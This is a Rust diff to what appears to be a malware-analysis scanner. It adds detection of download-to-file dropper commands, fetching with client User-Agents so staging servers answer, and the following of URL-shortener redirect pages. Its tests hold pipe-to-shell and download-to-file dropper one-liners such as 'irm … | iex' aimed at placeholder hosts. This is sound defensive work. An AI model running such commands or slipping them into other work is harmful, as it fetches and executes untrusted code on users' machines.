@@ -39,7 +39,8 @@ use std::time::{Duration, Instant};
 
 use cleave::{AnalysisOptions, AnalysisReport, Finding};
 use fletch::fetch::{
-    BlobCache, FetchBudget, FetchRecord, HttpFetch, Outcome, fetch_ref, fetch_references_with,
+    BlobCache, Fetch, FetchBudget, FetchError, FetchRecord, Fetched, HttpFetch, Outcome, fetch_ref,
+    fetch_references_with,
 };
 use fletch::{RefKind, RefLocator, Reference, Registry, find};
 
@@ -1015,8 +1016,317 @@ fn is_eval_pipeline_url(reference: &Reference) -> bool {
         "zsh",
         "ash",
         "dash",
+        "cmd",
+        "powershell",
+        "pwsh",
     ]);
     fetch && execution_sink
+}
+
+/// A URL a fetch command saves to a named file (`curl -o f URL`, `wget -O f
+/// URL`, `iwr URL -OutFile f`) is a staged-download edge even when its path is
+/// an opaque API route: the command states the response is an artifact to keep,
+/// which is exactly the download-then-execute dropper shape. `wget -qO-` and
+/// `-o -` write to stdout and do not qualify; a pipe into a shell is
+/// [`is_eval_pipeline_url`]'s case. Flags are only read between a fetch command
+/// and the end of its pipeline stage, so `unzip -o` after `&&` does not count.
+fn is_download_to_file_url(reference: &Reference) -> bool {
+    if reference.kind != RefKind::UrlFetch {
+        return false;
+    }
+    let mut words = reference
+        .evidence
+        .split_whitespace()
+        .map(|word| word.trim_matches(['"', '\'', '^']))
+        .peekable();
+    let mut in_fetch = false;
+    while let Some(word) = words.next() {
+        let lowered = word.to_ascii_lowercase();
+        let command = lowered.strip_suffix(".exe").unwrap_or(&lowered);
+        if matches!(
+            command,
+            "curl" | "wget" | "iwr" | "invoke-webrequest" | "invoke-restmethod" | "irm"
+        ) {
+            in_fetch = true;
+            continue;
+        }
+        if matches!(word, "|" | "||" | "&&" | "&") || word.ends_with(';') {
+            in_fetch = false;
+            continue;
+        }
+        if !in_fetch {
+            continue;
+        }
+        // The value an output flag names: attached (`-ofile`, `--output=f`,
+        // `-qO-`) or the following word.
+        let value = if let Some(long) = lowered.strip_prefix("--") {
+            match long.split_once('=') {
+                Some(("output" | "output-document", value)) => Some(value.to_string()),
+                None if matches!(long, "output" | "output-document") => None,
+                _ => continue,
+            }
+        } else if lowered == "-outfile" {
+            None
+        } else if let Some(cluster) = word.strip_prefix('-') {
+            // A short-flag cluster such as `-sLo` or `-qO-`: find the output
+            // flag among leading letters; what follows it is its value.
+            let Some((_, flag_and_value)) = cluster
+                .find(['o', 'O'])
+                .and_then(|at| cluster.split_at_checked(at))
+                .filter(|(flags, _)| flags.bytes().all(|b| b.is_ascii_alphabetic()))
+            else {
+                continue;
+            };
+            let attached = flag_and_value.get(1..).unwrap_or_default();
+            (!attached.is_empty()).then(|| attached.to_string())
+        } else {
+            continue;
+        };
+        let value = value.or_else(|| words.peek().map(|next| (*next).to_string()));
+        if value.is_some_and(|value| !value.is_empty() && value != "-") {
+            return true;
+        }
+    }
+    false
+}
+
+/// User-Agents of the command-line clients a staged download names. Pinned to
+/// current releases; a staging server gates on the product token, not the
+/// exact version.
+const CURL_USER_AGENT: &str = "curl/8.7.1";
+const WGET_USER_AGENT: &str = "Wget/1.21.4";
+const POWERSHELL_USER_AGENT: &str =
+    "Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.4648";
+
+/// The User-Agent the command that names a URL reference would send.
+///
+/// Staging servers routinely answer only the client their one-liner uses: a
+/// C2 behind `curl -L … | sh` returns 403 to a browser or a scanner that
+/// announces itself, so fetching as `fletch` retrieves nothing. A redirect
+/// destination continues a download chain and is fetched as curl, the client
+/// such chains overwhelmingly use. `None` (no fetch command in the evidence)
+/// keeps fletch's own agent.
+fn client_user_agent(reference: &Reference) -> Option<&'static str> {
+    if reference.kind != RefKind::UrlFetch {
+        return None;
+    }
+    if reference.source == REDIRECT_DESTINATION_SOURCE {
+        return Some(CURL_USER_AGENT);
+    }
+    reference.evidence.split_whitespace().find_map(|word| {
+        let word = word
+            .trim_matches(|c: char| !c.is_ascii_alphanumeric() && c != '-')
+            .to_ascii_lowercase();
+        match word.strip_suffix(".exe").unwrap_or(&word) {
+            "curl" => Some(CURL_USER_AGENT),
+            "wget" => Some(WGET_USER_AGENT),
+            "iwr" | "irm" | "invoke-webrequest" | "invoke-restmethod" => {
+                Some(POWERSHELL_USER_AGENT)
+            }
+            _ => None,
+        }
+    })
+}
+
+/// A fetch backend that requests each URL with the User-Agent of the client
+/// that names it (see [`client_user_agent`]), keyed by locator. Every other
+/// request passes through unchanged.
+struct AsClient<'a> {
+    net: &'a HttpFetch,
+    agents: HashMap<String, &'static str>,
+}
+
+impl Fetch for AsClient<'_> {
+    fn get(&self, url: &str) -> Result<Fetched, FetchError> {
+        match self.agents.get(url) {
+            Some(agent) => self.net.get_with(url, &[("User-Agent", agent)]),
+            None => self.net.get(url),
+        }
+    }
+
+    fn get_with(&self, url: &str, headers: &[(&str, &str)]) -> Result<Fetched, FetchError> {
+        self.net.get_with(url, headers)
+    }
+
+    fn get_any_status(&self, url: &str, headers: &[(&str, &str)]) -> Result<Fetched, FetchError> {
+        self.net.get_any_status(url, headers)
+    }
+
+    fn post(
+        &self,
+        url: &str,
+        body: &[u8],
+        headers: &[(&str, &str)],
+    ) -> Result<Fetched, FetchError> {
+        self.net.post(url, body, headers)
+    }
+
+    fn allows_oci(&self) -> bool {
+        self.net.allows_oci()
+    }
+}
+
+/// [`Reference::source`] for a URL that a fetched redirect page names as its
+/// destination (see [`redirect_destinations`]).
+const REDIRECT_DESTINATION_SOURCE: &str = "redirect-destination";
+
+/// Redirect pages larger than this are real sites, not an interstitial.
+const REDIRECT_PAGE_MAX_BYTES: usize = 1024 * 1024;
+
+/// Most redirect pages a chain may pass through before depth accounting
+/// resumes; bounds the extra hops [`orchestrate`]'s redirect credit can grant.
+const MAX_REDIRECT_HOPS: u8 = 3;
+
+/// Destinations an HTML redirect page sends its visitor to: a
+/// `<meta http-equiv=refresh content="0; url=…">`, a URL-shortener
+/// interstitial's hidden destination field (`<input type=hidden id=long_url
+/// value=…>`), or a script's `location = "…"` / `location.replace("…")`.
+///
+/// A dropper URL behind a shortener (`curl -L https://short.link/x | sh`)
+/// answers with such a page whenever the shortener shows a preview or safety
+/// warning instead of a 3xx. The page is not the payload; the destination is.
+/// Only absolute http(s) URLs are returned.
+fn redirect_destinations(bytes: &[u8]) -> Vec<String> {
+    if bytes.len() > REDIRECT_PAGE_MAX_BYTES {
+        return Vec::new();
+    }
+    let html = String::from_utf8_lossy(bytes);
+    let lower = html.to_ascii_lowercase();
+    // An HTML document opens with markup; a script that merely mentions a
+    // `<meta` tag in a comment or heredoc is not a redirect page.
+    let head = lower
+        .get(..lower.floor_char_boundary(1024))
+        .unwrap_or_default();
+    if !head
+        .trim_start_matches(['\u{feff}', ' ', '\t', '\r', '\n'])
+        .starts_with('<')
+        || !["<!doctype html", "<html", "<head", "<meta"]
+            .iter()
+            .any(|marker| head.contains(marker))
+    {
+        return Vec::new();
+    }
+    let tags = |name: &'static str| {
+        lower.match_indices(name).filter_map(|(at, _)| {
+            let end = at + html.get(at..)?.find('>')?;
+            html.get(at + name.len()..end)
+                .filter(|body| body.starts_with(|c: char| c.is_ascii_whitespace()))
+        })
+    };
+
+    let mut found = Vec::new();
+    for tag in tags("<meta") {
+        if html_attr(tag, "http-equiv").is_some_and(|v| v.eq_ignore_ascii_case("refresh"))
+            && let Some(content) = html_attr(tag, "content")
+            && let Some(at) = content.to_ascii_lowercase().find("url=")
+            && let Some(url) = content.get(at + "url=".len()..)
+        {
+            found.push(url.trim_matches(|c: char| c.is_whitespace() || c == '\''));
+        }
+    }
+    for tag in tags("<input") {
+        let names_url = ["id", "name"].iter().any(|attr| {
+            html_attr(tag, attr).is_some_and(|v| v.to_ascii_lowercase().contains("url"))
+        });
+        if names_url
+            && html_attr(tag, "type").is_some_and(|v| v.eq_ignore_ascii_case("hidden"))
+            && let Some(value) = html_attr(tag, "value")
+        {
+            found.push(value);
+        }
+    }
+    for (at, keyword) in html.match_indices("location") {
+        let Some(rest) = html.get(at + keyword.len()..) else {
+            continue;
+        };
+        let rest = rest.strip_prefix(".href").unwrap_or(rest).trim_start();
+        let rest = match rest.strip_prefix('=') {
+            Some(assigned) if !assigned.starts_with('=') => assigned,
+            Some(_) => continue,
+            None => match rest
+                .strip_prefix(".replace(")
+                .or_else(|| rest.strip_prefix(".assign("))
+            {
+                Some(argument) => argument,
+                None => continue,
+            },
+        }
+        .trim_start();
+        let Some(quote @ ('"' | '\'' | '`')) = rest.chars().next() else {
+            continue;
+        };
+        // `rest` opens with the quote, so the literal is the second piece.
+        if let Some(value) = rest.split(quote).nth(1) {
+            found.push(value);
+        }
+    }
+
+    let mut urls: Vec<String> = Vec::new();
+    for url in found {
+        let url = url.replace("\\/", "/").replace("&amp;", "&");
+        let lowered = url.to_ascii_lowercase();
+        if (lowered.starts_with("https://") || lowered.starts_with("http://"))
+            && !urls.contains(&url)
+        {
+            urls.push(url);
+        }
+    }
+    urls
+}
+
+/// The value of attribute `name` in the body of one HTML start tag, quoted or
+/// bare. Attribute names match case-insensitively.
+fn html_attr<'a>(tag: &'a str, name: &str) -> Option<&'a str> {
+    // ASCII lowercasing keeps every byte offset, so `lower` indexes `tag`.
+    let lower = tag.to_ascii_lowercase();
+    let mut from = 0;
+    while let Some(found) = lower.get(from..)?.find(name) {
+        let start = from + found;
+        from = start + name.len();
+        if !lower
+            .get(..start)
+            .is_some_and(|before| before.ends_with(|c: char| c.is_ascii_whitespace()))
+        {
+            continue;
+        }
+        let Some(value) = tag.get(from..)?.trim_start().strip_prefix('=') else {
+            continue;
+        };
+        let value = value.trim_start();
+        return match value.chars().next() {
+            Some(quote @ ('"' | '\'')) => value.split(quote).nth(1),
+            _ => value.split(|c: char| c.is_ascii_whitespace()).next(),
+        };
+    }
+    None
+}
+
+/// Mark the references a fetched redirect page names as its destination, so
+/// the fetch gate follows them as the continuation of the edge that reached
+/// the page. A destination the byte hunt missed (a script-escaped `https:\/\/`)
+/// is added.
+fn mark_redirect_destinations(bytes: &[u8], refs: &mut Vec<Reference>) {
+    for url in redirect_destinations(bytes) {
+        let existing = refs
+            .iter_mut()
+            .find(|r| matches!(&r.locator, RefLocator::Url(u) if *u == url));
+        tracing::info!(url = %url, "fetched page is a redirect; following its destination");
+        match existing {
+            Some(reference) => {
+                reference.kind = RefKind::UrlFetch;
+                REDIRECT_DESTINATION_SOURCE.clone_into(&mut reference.source);
+            }
+            None => refs.push(Reference {
+                locator: RefLocator::Url(url.clone()),
+                kind: RefKind::UrlFetch,
+                source: REDIRECT_DESTINATION_SOURCE.to_string(),
+                evidence: url,
+                offset: 0,
+                pinned_hash: None,
+                content_sha256: None,
+            }),
+        }
+    }
 }
 
 /// A fetched dependency captured for upload to hopper as its own sample. Carries
@@ -1240,7 +1550,18 @@ pub(crate) fn orchestrate(
         .iter()
         .map(|f| (f.sha256.clone(), manifest_relpath(&f.path)))
         .collect();
-    for hop in 0..policy.depth {
+    // A redirect page is not a stage. A shortener's safety or preview page
+    // stands where an HTTP 3xx would, naming the payload instead of being it,
+    // so a payload reached through one credits its group a hop and the chain
+    // behind the redirect keeps its full `policy.depth`. Keyed by the payload
+    // content sha that `merge_payload` groups next-hop references under.
+    let mut redirect_credit: HashMap<String, u8> = HashMap::new();
+    for hop in 0..policy.depth.saturating_add(MAX_REDIRECT_HOPS) {
+        worklist.retain(|(sha, _)| {
+            hop < policy
+                .depth
+                .saturating_add(redirect_credit.get(sha).copied().unwrap_or(0))
+        });
         if worklist.is_empty() || out_of_time() {
             break;
         }
@@ -1391,6 +1712,8 @@ pub(crate) fn orchestrate(
                         if r.kind == RefKind::UrlFetch
                             && !looks_like_dropper_download_url(url)
                             && !is_eval_pipeline_url(r)
+                            && !is_download_to_file_url(r)
+                            && r.source != REDIRECT_DESTINATION_SOURCE
                             && !carriers.contains(url)
                         {
                             tracing::debug!(
@@ -1594,11 +1917,18 @@ pub(crate) fn orchestrate(
                     policy.max_url_fetches,
                     TOTAL_FETCH_COUNT.load(Ordering::Relaxed),
                 );
+                let url_net = AsClient {
+                    net: &res.net,
+                    agents: url_selected
+                        .iter()
+                        .filter_map(|r| Some((locator_key(r), client_user_agent(r)?)))
+                        .collect(),
+                };
                 let url_fetched = fetch_references_with(
                     &url_selected,
                     &source_sha,
                     true,
-                    &res.net,
+                    &url_net,
                     &res.cache,
                     url_budget,
                     &on_fetched,
@@ -1841,6 +2171,12 @@ pub(crate) fn orchestrate(
                     g.selected.iter().zip(g.fetched.iter().zip(payloads))
                 {
                     if let Some(mut payload) = payload {
+                        let credit = redirect_credit.get(&g.source_sha).copied().unwrap_or(0)
+                            + u8::from(selected_ref.source == REDIRECT_DESTINATION_SOURCE);
+                        if credit > 0 {
+                            redirect_credit
+                                .insert(payload.content_sha.clone(), credit.min(MAX_REDIRECT_HOPS));
+                        }
                         // Run registry-aware package composites on the dependency's
                         // standalone report before either consumer takes it. This
                         // lets the dependency grader see the same finding that the
@@ -4306,7 +4642,8 @@ fn analyze_payload(
     // Next-hop references discovered in the payload's own bytes — the full hunt,
     // so a stage-2 script's `curl | bash` (or an encoded URL) is followed.
     let mut next_from_bytes = Vec::new();
-    let payload_refs = find::references_in_bytes(&bytes, &name);
+    let mut payload_refs = find::references_in_bytes(&bytes, &name);
+    mark_redirect_destinations(&bytes, &mut payload_refs);
     if !content_sha.is_empty() && !payload_refs.is_empty() {
         next_from_bytes.push((content_sha.clone(), payload_refs));
     }
@@ -5330,8 +5667,135 @@ mod tests {
         reference.evidence = "wget cdn.jsdelivr.net/gh/example/stage | bash".to_string();
         assert!(is_eval_pipeline_url(&reference));
 
+        reference.evidence =
+            "curl --ssl-no-revoke -L https://example.test/opaque | cmd".to_string();
+        assert!(is_eval_pipeline_url(&reference));
+
+        reference.evidence = "iwr https://example.test/opaque | powershell -".to_string();
+        assert!(is_eval_pipeline_url(&reference));
+
         reference.evidence = "curl https://example.test/stage-opaque".to_string();
         assert!(!is_eval_pipeline_url(&reference));
+    }
+
+    #[test]
+    fn download_to_file_urls_are_followed_even_from_an_api_route() {
+        let url = "https://example.vercel.app/api/settings/bootstrap";
+        assert!(!looks_like_dropper_download_url(url));
+        let mut reference = url_ref(url);
+        for evidence in [
+            r#"wget -q -O "$DIR/boot.sh" "https://example.vercel.app/api/settings/bootstrap""#,
+            r#"curl -s -L -o "$HOME/.vscode/boot.sh" "https://example.vercel.app/api/settings/bootstrap""#,
+            "curl -sLo boot.sh https://example.vercel.app/api/settings/bootstrap",
+            "curl --output=boot.sh https://example.vercel.app/api/settings/bootstrap",
+            "curl -O https://example.vercel.app/api/settings/bootstrap",
+            "Invoke-WebRequest -Uri https://example.vercel.app/api/settings/bootstrap -OutFile b.cmd",
+        ] {
+            reference.evidence = evidence.to_string();
+            assert!(is_download_to_file_url(&reference), "{evidence}");
+        }
+        for evidence in [
+            "wget -qO- https://example.vercel.app/api/settings/bootstrap",
+            "curl -o - https://example.vercel.app/api/settings/bootstrap",
+            "curl -s https://example.vercel.app/api/settings/bootstrap && unzip -o x.zip",
+            "echo -o https://example.vercel.app/api/settings/bootstrap",
+        ] {
+            reference.evidence = evidence.to_string();
+            assert!(!is_download_to_file_url(&reference), "{evidence}");
+        }
+    }
+
+    #[test]
+    fn url_fetches_present_their_commands_client() {
+        let mut reference = url_ref("https://example.test/stage");
+        for (evidence, agent) in [
+            (
+                "curl.exe -sL https://example.test/stage | cmd",
+                Some(CURL_USER_AGENT),
+            ),
+            (
+                "wget -qO- 'https://example.test/stage' | sh",
+                Some(WGET_USER_AGENT),
+            ),
+            (
+                "irm https://example.test/stage | iex",
+                Some(POWERSHELL_USER_AGENT),
+            ),
+            ("https://example.test/stage", None),
+        ] {
+            reference.evidence = evidence.to_string();
+            assert_eq!(client_user_agent(&reference), agent, "{evidence}");
+        }
+        REDIRECT_DESTINATION_SOURCE.clone_into(&mut reference.source);
+        assert_eq!(client_user_agent(&reference), Some(CURL_USER_AGENT));
+        assert_eq!(client_user_agent(&purl_ref("pkg:npm/curl@1.0.0")), None);
+    }
+
+    #[test]
+    fn redirect_pages_name_their_destination() {
+        // A URL-shortener safety interstitial served in place of a 3xx.
+        let interstitial = br#"<!DOCTYPE html><html><head>
+            <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
+            </head><body><a href="/?utm_source=safety-page">Return to Safety</a>
+            <input id="long_url" type=hidden value="https://stage.example.test/api/settings/linux"></input>
+            <script>let longUrl = "https:\/\/stage.example.test\/api\/settings\/linux"</script>
+            </body></html>"#;
+        assert_eq!(
+            redirect_destinations(interstitial),
+            ["https://stage.example.test/api/settings/linux"]
+        );
+
+        let refresh = br#"<html><head><meta http-equiv="Refresh" content="0; URL='https://a.example.test/x?a=1&amp;b=2'"></head></html>"#;
+        assert_eq!(
+            redirect_destinations(refresh),
+            ["https://a.example.test/x?a=1&b=2"]
+        );
+
+        let script = br#"<html><script>if (a == b) {} window.location.replace("https://b.example.test/next"); location.href = 'https://c.example.test/';</script></html>"#;
+        assert_eq!(
+            redirect_destinations(script),
+            ["https://b.example.test/next", "https://c.example.test/"]
+        );
+
+        // Ordinary pages, relative targets, visible inputs, and non-HTML text
+        // name no destination.
+        for page in [
+            &br#"<html><body><a href="https://d.example.test/">link</a><input type="text" name="url" value="https://e.example.test/"></body></html>"#[..],
+            br#"<html><script>location = "/login";</script></html>"#,
+            br#"curl -L https://f.example.test/ | sh  # <meta http-equiv=refresh content="0;url=https://g.example.test/">"#,
+        ] {
+            assert!(redirect_destinations(page).is_empty());
+        }
+    }
+
+    #[test]
+    fn redirect_destinations_are_marked_for_the_fetch_gate() {
+        let page = br#"<!doctype html><input type="hidden" name="target_url" value="https://h.example.test/opaque">
+            <script>let u = "https:\/\/i.example.test\/escaped"; location.assign(u);</script>
+            <meta http-equiv="refresh" content="3;url=https://i.example.test/escaped">"#;
+        let mut refs = vec![
+            url_ref("https://h.example.test/opaque"),
+            url_ref("https://j.example.test/asset.css"),
+        ];
+        mark_redirect_destinations(page, &mut refs);
+        let sources: Vec<(String, &str)> = refs
+            .iter()
+            .map(|r| (locator_key(r), r.source.as_str()))
+            .collect();
+        assert_eq!(
+            sources,
+            [
+                (
+                    "https://h.example.test/opaque".to_string(),
+                    REDIRECT_DESTINATION_SOURCE
+                ),
+                ("https://j.example.test/asset.css".to_string(), "test"),
+                (
+                    "https://i.example.test/escaped".to_string(),
+                    REDIRECT_DESTINATION_SOURCE
+                ),
+            ]
+        );
     }
 
     #[test]
